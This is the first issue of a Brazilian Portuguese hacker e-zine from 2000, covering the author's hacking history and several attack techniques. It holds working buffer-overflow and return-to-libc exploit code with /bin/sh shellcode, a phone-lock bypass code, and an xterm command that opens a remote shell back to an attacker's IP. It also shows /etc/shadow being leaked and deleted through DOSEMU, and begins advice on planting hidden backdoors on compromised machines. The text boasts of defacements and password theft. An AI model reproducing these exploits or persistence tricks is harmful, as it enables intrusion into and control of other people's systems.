                     ______________  _______________
                   /'             / /               \
                  /     FATAL    / /    3RROR       /
                 /    __________/ /__________      /
                /    /_______        _______/     /
               /            /       /            /
              /     _______/       /_______     /
             /     /            __________/    /
            /     /            /              /
           /     /            /              /
          /_____/            /______________'

                    Numbah 00 - Beta Version
                    ^^^^^^ ^^ ^ ^^^^ ^^^^^^^
                        Some_day/03/2000
                        ^^^^^^^^^^^^^^^^


   Introduction!!!

   Iae Galerinha!!!! Fikaram com saudades???? "Pow mas o que esse kra ta falan-
do???" Acontece que voce nao suspeita quem vos falais neh??? Pois sou eu (como
diriam os teletubies) Dinovo!!! Cheat Struck voltou a escrever uma zinezinha 
que voces tanto curtem ler.
   Pois eh... Poko mais de 1 ano depois de eu encerrar a cszine (23/10/98) 
decidi voltar a escrever e "chefiar" otra zine. Dessa vez com um nome mais 
criativo neh... Fatal 3rror (feer!). Vou tentar me direcionar ao pessoal mais 
avancado e nao a begginers/wannabes como era antes, porem tambem nao to dizendo 
que soh os hax0r l33tos podem ler essa zine.
   Neste tempo que eu permanecia "parado" estava escrecendo para a zine do grupo
Death Knights a qual voces podem encontrar num link na minha page, alem duns 
textos e progs que voce encontra em minha page. Mas acontece que muitas vezes 
eu comecava a escrever uma materia e por falta de organizacao e tempo acabavam 
fikando perdidos no meu hd sem que ninguem pudesse le-los.
   Por issu decidi firmar uma nova zine por conta propria pois alem de meus 
files fikarem mais organizados, voces tambem vao receber ae mesmo em suas casas,
no aconchego do lar, o melhor da informacao udigrudi e escrita por esta figura 
ilustre do hacking brasileiro. =)
   Bem... como desta vez estou escrevendo sobre assuntos mais avancados estes 
exigem mais detalhes nas materias e frescuras a parte, por issu nao esperem que 
a fatal 3rror saia com a mesma rapidez da cszine. Mas tambem nao achem que a 
zine acabou soh por que fikou alguns meses sem ser publicada.
   A qualidade estara garantida. Mas agora chega de introducao neh... ninguem 
gosta de ler isso mesmo. Vamos as materias dessa primeira edicao...





  t0pics:


[01] The history...                                    / Cheat Struck
[02] Buffer Overflows                                  / Cheat Struck
[03] Burlando o codigo de travamento de celulares      / Cheat Struck
[04] Projeto Omega                                     / Cheat Struck
[05] A t3ckn33k do XTERM                               / Cheat Struck
[06] DOSEMU                                            / Cheat Struck
[07] Secret Backdoors                                  / Cheat Struck
[08] NSBackdoor                                        / Cheat Struck
[09] iNiCiANDO VARiOS KERNELS NO LiLO BOOT             / Cheat Struck
[10] Make index                                        / Cheat Struck
[11] Calculadora de Vezes                              / Cheat Struck
[12] The End                                           / Cheat Struck





  TiPS:
  Anexo a zine voce encontra o programa extract.c que serve para extrair os
srcs que voce encontra dentro da zine. Issu deixa sua vida muito mais facil.
Basta rodar ./extract f3-00.txt e os srcs serao extraidos em seus respectivos
diretorios.










    ______
___/   __ \______
      ) _\_)_____)    01. The history...
     / (____)             Cheat Struck
      (_____)
--\___(____)


   C voce nao gosta de ler historias de um velho devagante nem eh bom continuar 
nesta materia, mas eu aconselho, pois a sua historia podi ser muito parecida 
com esta que vai ler, ou voce pode se identificar com situacoes ou personagens 
daki. 

   Entao era uma vez...

   Achu q foi 1995, novembro qdo ganhei meu primeio computador. Um pc pentium 
100 que na epoca era o mais avancado do mercado. Os primeiros meses foram soh 
jogando jogos, ja comprados com antecedencia. Claro que numa epoca de Megadriver
e SNES um jogo de computador era tudo o que voce sonhava.
   Mais tarde comecei a me interessar pelo msdos e comecei a explorar arquivos 
.bat onde fazia menus com echo, if errorlevel, choice, etc... mais tarde desco-
bri arquivos de inicializacao como autoexec.bat, config.sys e fui explorando-os 
assim como os do windows.
   Ja era 1996 quando descobri a internet pela casa do meu primo. Logo havia 
conseguido uma senha e comecei a acessar de casa. Usava o troco imprudentemente 
das 3 as 5 da tarde e quando chegava a conta telefone minha mae quase morria 
para paga-la.
   As primeiras paginas visitadas eram as da secao Hacker do cade.com.br e eu 
achava o maximo qdo lia textos de pessoas que pareciam ser super hackers,
escrevendo sobre como ligar de graca de celulares, com diodos e coisa e tal. E 
falavam sobre como hackear umas tal de BBSs que eu nem fazia ideia do que eram.
Mas eu salvava os textos e lia-os com todo o carinho mesmo as vezes sem
entende-los.
   Logo descobri as famosas ezines hackers. A primeira que li foi a FuckWorld. 
Bah!! Que afude!!! Varios textos dakeles que eu achava por ae, tudo reunidos 
num soh arquivo. Goste muito quando a descobri e dai comecei a fazer procuras 
no cade por zines e foi dae que achei Axur05, NearZ, NetHack, RWX, e outras que 
agora ja nao lembro o nome de todas.
   Tinha dificuldade com os textos mas mesmo assim continuava lendo-os pois 
sempre aprendia algo novo. Ja fazia scripts para mirc, mechia um poko com o 
linux (deu trabaio pra instala) e tinha feito programas em basic e VB muito poko
difundidos na inet.
   Ae eu pensei "porque nao fazer uma zine tbm?". Confesso que eu era um merda 
quando comecei a cszine e pela pessima qualidade das primeiras edicoes nem tive 
muito retorno. Mas aos poucos eu comecei realmente a evoluir. Comecei a me
interessar mais pelo universo linux e entao ja dava pra escrever umas materias 
"legiveis".
   Nesta epoca eu era do tipo controlado. Entrava na inet somente nos fins de 
semanas e buscava edicoes novas de zines e tudo quanto eh texto para que durante
a semana eu tivesse bastante literatura. Entrava no irc mas sempre meio away.
   Comecei a conhecer o pessoal de outras zines como o Kbyte da RWX, o Cacaio 
da DK, o AcidBrain da Hack n' Phreak, o ZeFuReNgA da ICMP e outros cujo a 
conversa foi tao raza que nem lembro direito. Mas o que importa eh que eu ja 
estava ficando conhecido entre a comunidade underground e fazendo novos amigos.
Entao comecaram a surgir novos editores para a cszine. Legal.
   As noites agora ao invez deu fikar away no irc e procurando coisas novas eu 
botava em pratica tudo o que ja havia aprendido, com os manows que ja eram mais 
chegados meus. Vamos ver c me lembro de alguns dos defacements que fiz com 
eles.... 
  Com o ZeFuReNgA rolou um ftp onde pega-mos o backup do passwd alem de 
trocarmos files de senhas e otras coisitas.... Lembro que ele me passou o passwd
da Brasnet que eu nem cheguei a aproveitar muito. Ahhh!! Lembro que tbm rolou 
um host japones. Com o AcidBrain rolou varios host por bugs de cgi e outros 
remotos. Achu que o phf da cyberspace, que na epoca nao era fake, eu descobri 
com ele. Foi afude a experiencia que esse kra me passou. O Cacaio eu soh
conhecia por email e ateh entao nunca havia rolado um hack grupal (hehehe) com 
ele.
   Achu que estes foram as primeiras pessoas mais importantes cujo eu trocava 
ideias. Por issu dei destaque a elas aki. Tbm rolava uns papo inteligentes com 
o spectro, Lucifer e outros kras que eu conheci na irc.procergs.com.br.
   Foi quando eu perdi minha conta na inet e fikei meio a zero. =\
   Depois disso comecou a fase negra na historia. :(
   Eu pensava que teria que assinar um provedor ou iria morrer de depressao, soh
pensando no que poderia estar rolando e novo na inet. Ae tentei criar uma 
dakelas contas fake na mandic mas ja nao funcionavam mais. Entao eu fikava
conectado a mandic pelo telefone de cadastro e vendo as page, scaneando portas, 
IPs, tudo pra ver c achava algo que me desse algum conforto. Hehehehe... Nao eh 
que o papai aki descobriu um bug num cgi non-opensource de lah... Porra... Achu 
que me emocionei pra kraio. Ja havia contado pro meu irmao, meus pais, meu primo
e logo toda a minha familia ja sabia que eu acessava internet ilegalmente. :\
   Ja tinha conseguido o shadow inteiro de lah qdo deu pau no windows e perdi 
tudo. Ae tentei dinovo soh que dessa vez pelo linux. Nem quiz o file inteiro 
pois era muuuuuita coisa mesmo. Ae decidi pegar soh ateh quando eu achasse que 
era suficiente. Deixei um dia inteiro o cracker descriptando as senhas e no dia 
seguinte ja nao via a hora de conectar.
   Entao eu pensei no que havia acontecido e c acontece-se dinovo o que seria 
da minha zine?? Ela ia acabar assim como as outras, sem dar explicacao alguma. 
Ae decidi acaba com ela. C voce ainda se lembra eu viajei um monte na introducao
dakela ultima edicao, mas p0w... O colegio tinha acabado, meus amigos tudo 
viajando e eu ia fikar na praia pegando sol sem poder mecher num comp. Foi ae 
que descobri que estava me viciando nessa porra.
   1999. Achu que foi o melhor ano para me aprendizado. Comecei a acessar a 
brasnet e logo conheci varias celebridades como (vamos ver c coloco todos aki):
t0ne0ne, unsigned, source, sk, fsck (do tempo da #hackphr), encripty, Renegade,
troy-psx, spike (#fashion_eh_meu_ovo), PaPill0n, Phroid, TPGA (#phreak), thasmx,
suggarface (#r00t qdo era private e secret) alem de outros que nem lembro aonde 
conheci: Over_Death, Zanndon, d3m3ns, Carti, DaveMustaine, e tem uma porrada
de gente... Nem vai da pra bota todos aki alem da minha memoria ser limitada e 
nao consigo lembra todos os nicks.
   Os primeiros que conheci foram os ex-membros da ex-hack n' phreak cujo eu 
nem me dava taum bem assim. Qdo o grupo se mudou de knal para o #r00t que eu 
comecei a fazer amizade com os kra. Entao eles formaram o bl0w (grupo hacker 
politico elitao) e o knal agora era private e soh para invites mas como eu ja 
era manow tinha +v lah. =)
   Entao fikei sabendo que os DK-members tbm tinham um knal lah... 
#fashion_eh_meu_ovo. hehehe. Agora tbm conhecia melhor os outros Death Knights 
(eu ja havia me tornado um).
   O #phreak conheci +/- junto a estes onde agora eu aprendia phreak de verdade
(nao soh a ligar di graca) com os manows da phreakhaos.
   Entao a Bl0w comecou a fazer sucesso "Bl0wnando" sites do governo com 
mensagens contra o FHC, ACM e outras burradas que os politicos faziam. Logo todo
mundo tinha seu grupinho anti-politico. A moda havia deixado de ser grupos de 
zines agora... o unico que ainda existia era o da DK. Com o sucesso da Bl0w o 
knal #r00t (ja sem mais private) comecou a encher e virou uma versao neo do
#hackers e #linux. Entravam as mais diversas almas-perdidas lah soh pra fazerem 
perguntas bestas do tipo "como uso o iishack??". Entao um novo knal foi criado 
para os manos antigos. Dessa vez ateh mesmo com senha. Q l33to!! =)
   A bl0w nao existia mais. Agora os ex-membros e amigos deidicavam-se a falar 
sobre mulheres, sexo, punheta entre outros assuntos do genero. Ja a DK comecava 
uma fase de defacementes. Nem nos importavamos com a porra de msg que a page 
0wnada iria levar. O que queriamos era 0wnar todas as shells que o encripty nos 
conseguia e fikar-mos felizes da vida escrevendo sobre qquer bobagem na zine.
   Numa dessas investidas, eu e o encripty fizemos akele MASS HACK onde 0wnamos 
uma porra de pages (mais de 100) numa unica noite. Mas issu nao estava agradando
a todos nao... Derepente comecei a me queimar com alguns dos meus velhos chapas 
e ja nao mantia mais contato com os ex-bl0ws. Uma vez ou outra num pvt, mas nao 
era mais a mesma coisa.
   Entao as ideias comecaram a c desorganizar na minha cabeca e parei um poko 
de 0wnar me dedicando unicamente a codear programas, exploits, scanners, etc...
   A zine da DK ja nao agradava mais a todos, comecou a perder qualidade nas 
materias. Claro que a politica da DK eh "A zine nao se responsabiliza pelas 
materias, mas sim seus autores. Se acha alguma ruim, faca uma melhor. Ela tambem
sera publicada." mas os membros pareciam que escreviam apenas para assinar seus 
nicks na zine. Como no momento esta era a unica zine ainda existente que tratava
do assunto comecaram a vir diversos questionamentos sobre o futuro da DK e c eu 
nao iria continuar mesmo com a cszine.
   Kraio! Ateh me fizeram propostas de iniciar uma zine para os grupos que eu 
ia conhecendo e de certa forma fazendo parte deles. Mas encheram tanto o sako 
que durante a primeira semana do milenio parava nas noites para refletir sobre 
o assunto e achei que podia nao ser tao ma ideia assim.
   Entao comecei a ir atraz de textos inacabados que eu fazia e nunca tiveram 
chance de serem publicados e ia concluindo-os e quando vi, ja dava pra criar uma
zine soh com akilo que eu tinha. Mas eu queria qualidade agora, entao chamei 
alguns editores dos quais eu creio serem bastante experientes e estes contri-
buiam ateh eu decidir que a zine ja ta em ponto de bala para ser lancada.
   Pois bem. A fatal 3rror foi lancada e desde o meu inicio com os computadores
ateh este zine foi contado neste texto. Se um dia fizerem um filme da minha vida
aki esta uma bela biografia. =)
   C algum parceiro meu nao teve o seu nick publicado aki, eu peco desculpas mas
como voces podem ter visto eh muita gente para eu me lembrar e tambem nao tenho 
como manter contato com todos pois muitos ja mudaram de emails e de nicks entao 
c tiverem lendo issu, mandem um email pra mim, pq soh de ler issu ja bate uma
saudade (q coisa gay). =)
   []'z e kissez para todos os que foram mencionados aki ou que um dia me 
conheceram.










    ______
___/   __ \______
      ) _\_)_____)    02. Buffer Overflows
     / (____)             Cheat Struck
      (_____)
--\___(____)


  Ooooh sako... Todo mundo reclama q nao entende porra nenhuma dissu e que
todos os txts saum complicados e blablabla... Entao vo tentar ser bem
claro nessa porra de txt e aprendam logo pois issu ja pode ser considerado
uma t3kn33k antiga...
  Nao vou me pegar muito a parte teorica pois issu que deve estar
atrapalhando vcs...

  Aki temos um exemplo de buffer overflow...
(Use o extract.c da phrack para separar estes prgs)

<++> buff/vuln.c
void lame (void) { char small[30]; gets (small); printf("%s\n", small); }
main() { lame (); return 0; }
<-->

~# gcc -ggdb -o vuln vuln.c
~# ./vuln
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
~#

  Agora vamos ver esse core com o gdb...

~# gdb vuln core
GNU gdb 4.17.0.4 with Linux/x86 hardware watchpoint and FPU support
Copyright 1998 Free Software Foundation, Inc.
BlaBlaBla...
Core was generated by `./vuln'.
Program terminated with signal 11, Segmentation fault.
Reading symbols from /lib/libc.so.6...done.
Reading symbols from /lib/ld-linux.so.2...done.
#0  0x41414141 in ?? ()
(gdb)

  Prontu... nem precisa do info registers....
  Aqui voce ve onde acontece o segment fault...
  Note a seguinte linha:

#0  0x41414141 in ?? ()

  Ao vc entrar com os A'z (0x41) no gets... Esses dados foram salvos alem
do buffer que tinha o tamanho de 30 bytes... Passando esse limite do
buffer nos encontramos o RETURN ADDRESS. Eh ae que acontece os sonhos... =)
  Quando gravamos esses A'z em cima do RETURN_ADDRESS ao invez da funcao
retornar ao ADDRESS original e o programa continuar a ser executado, ele
vai retornar ao novo ADDRESS (0x41414141) onde nao existe porra nenhuma...
Entao ocorre o Segment Fault...
  O novo ADDRESS no nosso caso eh 0x41414141 pq nos gravamos AAAA em cima
do original e lembre-se que A eh 0x41 em hexa...

  Entendeu tudo issu??? Nao... leia dinovo entao.... C entendeu vamos
continuar...

  Toda a brincadeira comeca em saber onde direcionar o RETURN_ADDRESS.
  Agora vamos ver como faremos para reescrever este RET_ADDR com um
endereco valido...

~# gdb vuln
GNU gdb 4.17.0.4 with Linux/x86 hardware watchpoint and FPU support
Copyright 1998 Free Software Foundation, Inc.
BlaBlaBla...
(gdb) disass main
Dump of assembler code for function main:
0x8048550 <main>:       pushl  %ebp
0x8048551 <main+1>:     movl   %esp,%ebp
0x8048553 <main+3>:     subl   $0x8,%esp
0x8048556 <main+6>:     call   0x8048520 <lame>
0x804855b <main+11>:    xorl   %eax,%eax
0x804855d <main+13>:    jmp    0x8048560 <main+16>
0x804855f <main+15>:    nop
0x8048560 <main+16>:    movl   %ebp,%esp
0x8048562 <main+18>:    popl   %ebp
0x8048563 <main+19>:    ret
End of assembler dump.
(gdb)

  Veja a seguinte linha:

0x8048556 <main+6>:     call   0x8048520 <lame>

  Note que esta eh a linha do vuln.c onde chamamos a funcao lame. Entao
vamos pegar o endereco deste... 0x8048556. Nao seja burro, o addr varia e
pode ser que ae no seu computador ele nao seja o mesmo...
  Vamos escrever o exploit entao...

<++> buff/ret.c
main()
{
   int i=0; char buf[44];
   for (i=0;i<=40;i+=4)
    *(long *) &buf[i] = 0x8048556;    // Substitua aki o addr
   puts(buf);
}
<-->

~# gcc ret.c -o ret
~# (./ret;cat) | ./vuln
VVVVVVVVVVVôüÿ¿¹×@È£
teste                           (digite aki)
teste
teste                           (digite aki)
~#

  Aha!!! Como mudamos o RET_ADDR para o endereco onde a funcao lame eh
chamada, repetimos-a. Este eh um exploit nocivo feito apenas para mostrar 
como reescrever o RET_ADDR.

  Se quizermos algo mais proveitoso o que devemos fazer eh o seguinte...
  Voce c lembra dakelas shellcodes que todos os exploits de buffer overwrite
tem??? Pois eh... Vamos ver onde ele entra aki...

  Nao vo ensinar como criar suas shellcodes pois issu vai nos tirar do
plano central deste texto...
  A shellcode eh salva em um buffer do exploit. Entao o que devemos fazer
eh direcionar o RETURN_ADDRESS para o inicio da shellcode. ahhhhh!!!
  Vamos usar o famoso shellcode do aleph1 para nosso exemplo de exploit:

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

  Lembram???
  Agora diretamente do txt do aleph1 vamos a um prog de exploita um buffer
overflow nele mesmo... (Leia os comentarios)


<++> buff/xploit1.c

char shellcode[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

char large_string[128];

void main() {
  int i;
  long *long_ptr = (long *) large_string;


//  Aki esta o buffer vulneravel...
  char buffer[96];


//  Aki vamos copiar o ADDRESS do buffer[] para esta variavel.
  for (i = 0; i < 32; i++)
    *(long_ptr + i) = (int) buffer;


//  Aki copiamos o shellcode para a mesma variavel, soh que ocupando o
// inicio dela... Fikara algo assim:
//
// SHELCODE+ENDERECO_DO_BUFFER
//
  for (i = 0; i < strlen(shellcode); i++)
    large_string[i] = shellcode[i];


//  Aki esta o buffer overflow...
  strcpy(buffer,large_string);

}
<-->

  Compile, execute e o programa sera exploitado. O RET_ADDR sera reescrito
para o endereco da string buffer[]. Como no inicio do buffer[] sera salvo
o shellcode entao este sera executado... Resultado: SHELL!!!
  Bem... mas o que nos queremos eh exploitar o buffer em um outro programa
e nao no nosso... Entao o problema aki seria como pegar o RET_ADDR do
buffer de um outro programa... 
  Para simplificar mais as coisas, basta voce ter em maos o source do
programa (a maioria dos prg no linux sao opensource). Vamos a um exemplo:

<++> buff/vuln2.c

void main(int argc, char *argv[]) {
  char buffer[96];

  if (argc > 1)
    strcpy(buffer,argv[1]);
}

<-->

  Ao encontrar o buffer vulneravel (buffer[]), adicione a seguinte linha
no corpo do programa:

  printf("0x%x\n",(int) buffer);

  Claro, mude "buffer" pela variavel q vc encontrar (caso esteja tentando
escrever o exploit para outro programa). Compile e rode que vc tera retorno o 
endereco correto do buffer vulneravel. Deixe o programa assim ateh que o xploit 
funcione corretamente, pois pode ser que voce precise fazer mais de uma mudanca 
neste endereco.

~# pico vuln2.c
(modifique-o...)
~# gcc vuln2.c -o vuln2
~# ./vuln2
0xbffffcd8
~#


  Blza!!! Ja temos o endereco, agora vamos fazer o exploit:

<++> buff/xploit2.c

char shellcode[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

char large_string[128];

void main() {
  int i;  
  long *long_ptr = (long *) large_string;

  for (i = 0; i < 32; i++)
    *(long_ptr + i) = 0xbffffcd8;  //Coloque aki o endereco do buffer vuln

  for (i = 0; i < strlen(shellcode); i++)
    large_string[i] = shellcode[i];

  execl("./vuln2", "vuln2", large_string, 0);
}

<-->

  Okay... Eh basicamente a mesma coisa do outro xploit que vimos porem aki
o endereco que sera reescrito no RET_ADDR mudou. Compile e rode:

~# gcc xploit2.c -o xploit2
~# ./xploit2
0xbffffc18
Illegal Instruction (core dumped)
~#

  Aha!!! Que loko... o Endereco do buffer mudou.... sem problemas... vamus
muda-lo no exploit... Depois de fazer issu tente dinovo...

~# ./xploit2
0xbffffc18
sh-2.03#

  Aeeeeeeeeeeeeee!!!!!!!!!
  Agora nao tem essa de faze cu-doce e mudar di endereco... nois ti
pegamos!!!! h0h0h0h0h0h0h0!!! Buffer Exploited!!!!
  Manero neh??? Voce criou seu primeiro exploit. Mesmo sendo para um prog
seu mesmo eu sei como eh a emocao pois ja passei por issu. Agora voce ja
tem uma base de como esses doces funcionam e de como faze-los. Agora va
atraz de mais textos explicando issu para vc c aperfeicoar mais nessa
t3kn33k pois ja expliquei tudo o que achei necessario.
  Aki vao alguns textos a serem consultados caso voce queira saber mais
sobre buffers overflows:

Nome : Smashing The Stack For Fun And Profit
Autor: Aleph One
Ondi : www.securityfocus.com

Nome : Writing buffer overflow exploits - a tutorial for beginners
Autor: Mixter
Ondi : members.tripod.com/mixtersecurity/papers.html

Nome : B4B0 07
Autor: ph1x
Ondi : www.b4b0.org


  Espero que tenham gostado porque suei pra fazer essa materia. 










    ______
___/   __ \______
      ) _\_)_____)    03. Burlando o codigo de travamento de celulares
     / (____)             Cheat Struck
      (_____)
--\___(____)


   Bah! O sistema de travamento dos celulares gradientes e nokias sao
horriveis e nao servem pra porra nenhuma pois qquer um com um pouco de
cerebro consegue burla-lo. Let's see...
   Para ativar o travamento faca o seguinte trageto:

Menu/Config/Seguranca/Codigos de acesso/Travamento do telefone

   Aki voce Ativa/Desativa o travamento. Se ativado, toda a vez que o
telefone for ligado Sera preciso entrar com o codigo de travamento, que
voce muda em:

Menu/Config/Seguranca/Codigos de acesso/Alterar codigo de travamento

   O telefone tambem possui o codigo de seguranca que pode ser usado em
todos os casos de senha, inclusive no codigo de travamento. Ae que
entramos no jogo.
   Para ver o codigo de seguranca limpo (e nao em *****) voce precisara
entrar no modo de programacao do gradiente. Como fazer isso??? No menu
digite:

*3001#12345#

   Voce vai cair em um novo menu com NAM1, NAM2, Security, etc...
   Entre em Security e tchanananam!!!!! Ae esta o codigo de seguranca.
   Voce pode entrar no modo de programacao ateh mesmo quando o telefone
estiver travado e entao usar o codigo de seguranca para liberar o
telefone.
   Issu funfa em gradientes strike e nokias 21xx, 51xx e seilah quais os
outros, mas a maioria desses pre-pagos de cartao sao vulneraveis.
   Issu ae.










    ______
___/   __ \______
      ) _\_)_____)    04. Projeto Omega
     / (____)             Cheat Struck
      (_____)
--\___(____)


   Este projeto visa criar uma nova maneira de se escrever exploits, sem
precisarmos criar um shellcode nem tentarmos varios offsets, etc...
   Mas como issu funcionaria???
   Eh o seguinte...
   No metodo comum de exploitar, reescrevemos o RET ADDR para que ele seja
direcionado ao inicio do buffer e assim execute o shellcode.
   Neste novo metodo direcionamos o RET ADDR para o address da funcao
system() e assim possamos executar um /bin/sh por exemplo.
   Vamos colocar um prog vulneravel primeiro:

<++> omega/vuln.c

main(int argc, char **argv)
{
   char buf[8];
   if(argc > 1) strcpy(buf, argv[1]);
}

<-->

   Esse programa pode ser facilmente exploitado do metodo basico, mas
vamos ver como faze-lo baseado neste projeto...
   (Veja os comentarios).

<++> omega/ex.c

#include <stdlib.h>
#include <dlfcn.h>

main(int argc, char **argv)
{
   int a,b;
   char *buf;
   long addr,shell,i;
   void *handle;

// Procura pelo system() na libc.
   handle = dlopen(NULL,RTLD_LAZY);
   addr = (long)dlsym(handle,"system");

// Procura por "/bin/sh" a partir do address do system().
   shell = addr;
   while(memcmp((void*)shell,"/bin/sh",8))
        shell++;

// Vamos fazer o buffer (de 24 bytes).
   memset(buf,0x41,24);

// Veja a manha aki...
   *(long *)&buf[12] = addr;    // system()
   *(long *)&buf[20] = shell;   // arg1 ("/bin/sh");

   execl("vuln","vuln",buf,0x0);
}

<-->

   Agora vamos ver c funciona direito...

~# gcc ex.c -o ex -ldl
~# gcc vuln.c -o vuln
~# ./ex
Illegal Instruction (core dumped)

   Duh!!!
   Vamos tentar assim...

~# gcc vuln.c -o vuln -ldl
~# ./ex
bash#

   Blza intaum!!!
   Realmente funfa mas tem suas exigencias... O exploit soh funciona
quando o programa vulneravel eh compilado com suporte a library dl. :P
   Issu eh tudo.










    ______
___/   __ \______
      ) _\_)_____)    05. A t3ckn33k do XTERM
     / (____)             Cheat Struck
      (_____)
--\___(____)


   Bah!!! Que viajem escrever sobre issu pois a tecnica ja eh taum
conhecida q nem da mais tesaum. Mas para quem matou aula vamos a
explicacao da t3ckn33k.

   Ao descobrir um bug remoto q lhe permita entrar com um unico comando,
voce pode fazer com que o host remoto lhe de shell do respectivo id
atravez do xterm.
   Issu pode ser muito util em xploits remotlys como Bind, PHF, etc...
   Para que issu funfe direito voce deve estar usando X ou nada feito.
Entao digite no host remoto o seguinte comando:

xterm -ut -display 222.222.222.222:0

Onde:
222.222.222.222 eh o seu ip.

   O -ut serve para que seu ip nao seja salvo nos log utmp.
   Pronto. Voce esta usando uma shell remotly.










    ______
___/   __ \______
      ) _\_)_____)    06. DOSEMU
     / (____)             Cheat Struck
      (_____)
--\___(____)


   Como tudo relacionado a MS eh uma merda, este emulador encontrado em
Leenoxs eh bugzado pra kraio e pode por seu sistema em risco c nao for
corrigido. Vou demosntrar como burlar o linux que estiver rodando este
emulador nas configuracoes originais e como corrigir o erro.
   Antes de comecar a testar os modos ensinados aki em sua maqina, faca um
backup do /etc/shadow, pois iremos usa-lo para demonstrar a inseguranca
deste programa.

   Neste 1o exemplo vou mostrar como qualquer usuario pode pegar
facilmente seu arquivo de senhas:


Script started on Thu Mar  2 00:17:48 2000
[struck@localhost ~]$ dos -F /etc/shadow
CPU speed set to 378/1 MHz
Running on CPU=586, FPU=1, rdtsc=1
Error in /etc/shadow: (line 001) unrecognized command 'root:SAlNq/oiIe8ik:11018:0:99999:7:::'
Error in /etc/shadow: (line 002) unrecognized command 'bin:x:11018:0:99999:7:::'
Error in /etc/shadow: (line 003) unrecognized command 'daemon:x:11018:0:99999:7:::'
Error in /etc/shadow: (line 004) unrecognized command 'adm:x:11018:0:99999:7:::'
Error in /etc/shadow: (line 005) unrecognized command 'lp:x:11018:0:99999:7:::'
Error in /etc/shadow: (line 006) unrecognized command 'sync:x:11018:0:99999:7:::'
Error in /etc/shadow: (line 007) unrecognized command 'shutdown:x:11018:0:99999:7:::'
Error in /etc/shadow: (line 008) unrecognized command 'halt:x:11018:0:99999:7:::'
Error in /etc/shadow: (line 009) unrecognized command 'mail:x:11018:0:99999:7:::'
Error in /etc/shadow: (line 010) unrecognized command 'news:x:11018:0:99999:7:::'
Error in /etc/shadow: (line 011) unrecognized command 'uucp:x:11018:0:99999:7:::'
Error in /etc/shadow: (line 012) unrecognized command 'operator:x:11018:0:99999:7:::'
Error in /etc/shadow: (line 013) unrecognized command 'games:x:11018:0:99999:7:::'
Error in /etc/shadow: (line 014) unrecognized command 'gopher:x:11018:0:99999:7:::'
Error in /etc/shadow: (line 015) unrecognized command 'ftp:x:11018:0:99999:7:::'
Error in /etc/shadow: (line 016) unrecognized command 'nobody:x:11018:0:99999:7:::'
Error in /etc/shadow: (line 017) unrecognized command 'postgres:x:11018:0:99999:7:::'
Error in /etc/shadow: (line 018) unrecognized command 'struck:YAOj6uk867WrY:11018:0:99999:7:::'
18 error(s) detected while parsing the configuration-file
Error in (null): (line 019) 
Your /etc/shadow script or /etc/dosemu.conf configuration file is obviously
an old style or a too simple one
Please read README.txt on how to upgrade

[struck@localhost ~]$ exit
Script done on Thu Mar  2 00:18:07 2000


   O segundo exemplo agora mostra como eh facil apagar seu /etc/shadow
usando o dosemu.


Script started on Thu Mar  2 00:19:32 2000
[struck@localhost ~]$ dos -o /etc/shadow
CPU speed set to 378/1 MHz
Running on CPU=586, FPU=1, rdtsc=1
Linux DOS emulator 0.98.1.0 Date: 98/09/12 
(Blablablablablabla...)
C:\>exitemu
[struck@localhost ~]$ cat /etc/shadow
[00000330] debug flags: 
[00003634] DOS termination requested
[00003636] 
[struck@localhost ~]$ exit
Script done on Thu Mar  2 00:20:00 2000


   Agora vamos passar um poko para a parte de security...
   A Fixacaum mais segura para essas falhas eh retirar o setuid bit dos:

[root@localhost /root]# whereis dos
dos: /usr/bin/dos /usr/man/man1/dos.1
[root@localhost /root]# chmod -s /usr/bin/dos
[root@localhost /root]#

   Issu ae! Que a forca esteje com vcs!!










    ______
___/   __ \______
      ) _\_)_____)    07. Secret Backdoors
     / (____)             Cheat Struck
      (_____)
--\___(____)

  C alem de colocar minha nsback elitona no sys hacked vc quizer garantir
o acesso novamente qdo bem entender, aki vai um truque pouco difundido
ainda na galera udigrudi.
  O esquema eh o seguinte...
  Digamos q voce r00ta a maquina por um bug de xterm entaum logo vc fixa
o bug rapidamente para que ninguem mais alem de vc tenha o controle. E
agora?? C o root descobrir sua back, vc c fodis...
  Nao c voce for espertalhaum...
  Vamos ver algumas das manhas...



#########
#  1o.  #
#########

  Trata-se de escrever um exploit para um bug qquer de um prog non-suid.
  Nao entendeu nada?? Assim... Voce ja deve ter escrito exploits de buffer
overflows para progs non-suid em quanto aprendia a fazer exploits com o
txt do Aleph1 naum??
  Feito o exploit va ao sys 0wned e sete o prog com +s e c precisar mude o
owner dele para root. Assim qdo vc quizer voltar a tomar o root lah, basta
usar seu xploit e prontu!!!



#########
#  2a.  #
#########

  Atualize a bagacera lah...
  Ah?? agora c pirou de vez!
  Naum fiotinhu... seguinte...
  Pegue por exemplo o SuidPerl. Hm? Q q tem? Pegue uma versaum bugzada
(5.003) e mude o numbah da versaum no source dele (lembrando q perl eh
opensource, voce encontra em ftp.gnu.org).
  Agora mande pra lah e make install.
  Preste Atencaum q em certos casos o root tira o atributo ug+s e muda
para go-rwx sendu assim ferra essa t3kn33k pois o maneh do root discobre a
farca rapidu, ou c nao discobre muda as permissoes novamente.
  Outro detalhe... Para quem faz shell backdoors... Os bashs mais atuais
ja vem patcheados contra os famosos suid backdoors entao preste atencao qdo
for fazer uma dessas, seria bom usa essa t3kn33k neste caso tbm...



#########
#  3a.  #
#########

  Pegue o source da mesma versao do programa "vitima" e mecha nele,
